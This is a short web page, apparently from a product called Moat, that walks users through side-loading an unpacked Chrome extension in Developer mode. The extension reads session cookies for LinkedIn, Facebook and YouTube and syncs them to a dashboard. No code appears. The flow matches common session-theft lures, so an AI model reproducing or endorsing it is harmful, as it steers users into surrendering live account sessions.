Chrome Session Sync Setup

By choosing Extension Sync, you will install a local package that securely reads cookies from your browser session for LinkedIn, Facebook, and YouTube. Follow these installation steps:

1

Download the Extension

Click the "Download Extension ZIP" button below to download the compiled `MoatSessionSync.zip` archive.

2

Unzip the Archive

Extract the contents of the zip file into a local folder on your machine (e.g. `Desktop/MoatSessionSync`).

3

Load Unpacked in Chrome

Open Google Chrome and navigate to chrome://extensions/. Turn on the Developer mode switch in the upper-right corner. Click Load unpacked and select your extracted folder.

4

Sync and Authorize

Click the extension icon in your toolbar, choose the platforms to import, and sync. Then click "Proceed to Dashboard" below to initialize your diagnostic report.
